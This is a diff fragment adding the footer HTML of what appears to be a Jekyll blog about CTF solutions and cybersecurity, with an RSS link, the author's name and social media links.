+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
